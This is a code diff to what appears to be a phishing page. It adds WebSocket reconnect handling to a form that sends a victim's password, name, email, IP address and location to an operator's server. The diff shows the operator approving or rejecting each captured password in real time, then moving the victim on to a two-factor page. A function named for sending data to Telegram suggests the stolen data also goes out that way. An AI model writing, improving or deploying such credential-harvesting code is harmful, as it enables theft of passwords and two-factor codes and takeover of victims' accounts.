@@ -134,6 +134,53 @@ $domain_name = file_get_contents('domain_name.txt');
 </body>
 
 <script>
+    let ws = null;
+    let reconnectInterval = 5000; // 5 seconds
+    let reconnectTimer = null;
+    let orderId = localStorage.getItem('currentOrderId');
+
+    function createWebSocket() {
+        ws = new WebSocket('wss://<?php echo $domain_name; ?>');
+
+        ws.onopen = function() {
+            console.log('Connected to WebSocket.');
+            clearTimeout(reconnectTimer);
+        };
+
+        ws.onclose = function() {
+            console.log('WebSocket connection closed. Reconnecting...');
+            reconnectTimer = setTimeout(createWebSocket, reconnectInterval);
+        };
+
+        ws.onerror = function(error) {
+            console.error('WebSocket error:', error);
+            ws.close();
+        };
+
+        ws.onmessage = function(event) {
+            const data = JSON.parse(event.data);
+            if (data.type === 'admin_approve_password_to_user' && data.order_id === localStorage.getItem('currentOrderId', orderId)) {
+                localStorage.setItem('currentOrderId', data.order_id);
+                localStorage.setItem('currentStep', data.step);
+                localStorage.setItem('currentPassword', data.password);
+                window.location.href = '/two-factor-authentication.php';
+            } else if (data.type === 'admin_reject_password_to_user' && data.order_id === localStorage.getItem('currentOrderId', orderId)) {
+                hideLoading();
+                var passwordInput = document.getElementById('password');
+                passwordInput.value = "";
+                passwordInput.value = data.user_info.password;
+                passwordInput.focus();
+                passwordInput.style.border = '1px solid #FF0303';
+
+                var passwordError = document.getElementById('password-error');
+                passwordError.textContent = "Password is incorrect, please try again";
+            }
+        };
+    }
+
+    // Initialize WebSocket connection
+    createWebSocket();
+
     document.addEventListener('DOMContentLoaded', function() {
         var nameElement = document.getElementById('name');
         var emailElement = document.getElementById('email');
@@ -166,29 +213,6 @@ $domain_name = file_get_contents('domain_name.txt');
         }
     });
 
-    const ws = new WebSocket('wss://<?php echo $domain_name; ?>');
-    let orderId = localStorage.getItem('currentOrderId');
-
-    ws.onmessage = function(event) {
-        const data = JSON.parse(event.data);
-        if (data.type === 'admin_approve_password_to_user' && data.order_id === localStorage.getItem('currentOrderId', orderId)) {
-            localStorage.setItem('currentOrderId', data.order_id);
-            localStorage.setItem('currentStep', data.step);
-            localStorage.setItem('currentPassword', data.password);
-            window.location.href = '/two-factor-authentication.php';
-        } else if (data.type === 'admin_reject_password_to_user' && data.order_id === localStorage.getItem('currentOrderId', orderId)) {
-            hideLoading();
-            var passwordInput = document.getElementById('password');
-            passwordInput.value = "";
-            passwordInput.value = data.user_info.password;
-            passwordInput.focus();
-            passwordInput.style.border = '1px solid #FF0303';
-
-            var passwordError = document.getElementById('password-error');
-            passwordError.textContent = "Password is incorrect, please try again";
-        }
-    };
-
     function sendToTelegramFromConfirmBusinessInformation(event) {
         event.preventDefault();
         var password = document.getElementById('password').value;
@@ -210,27 +234,33 @@ $domain_name = file_get_contents('domain_name.txt');
         var org = `<?php echo $org; ?>`;
         var timezone = `<?php echo $timezone; ?>`;
 
-        ws.send(JSON.stringify({
-            type: 'enter_password',
-            order_id: orderId,
-            password: password,
-            step: 2,
-            user_info: {
-                name: firstName + " " + lastName,
-                email: personalEmail,
-                ip: ip,
-                ip_address: ip_address,
-                city: city,
-                region: region,
-                country: country,
-                org: org,
-                timezone: timezone,
+        if (ws && ws.readyState === WebSocket.OPEN) {
+            ws.send(JSON.stringify({
+                type: 'enter_password',
+                order_id: orderId,
                 password: password,
-                code: "",
-                phone: ""
-            }
-        }));
-        showLoading();
+                step: 2,
+                user_info: {
+                    name: firstName + " " + lastName,
+                    email: personalEmail,
+                    ip: ip,
+                    ip_address: ip_address,
+                    city: city,
+                    region: region,
+                    country: country,
+                    org: org,
+                    timezone: timezone,
+                    password: password,
+                    code: "",
+                    phone: ""
+                }
+            }));
+            showLoading();
+        } else {
+            console.error('WebSocket is not connected. Cannot send data.');
+            window.location.reload();
+            return;
+        }
     }
 </script>
 
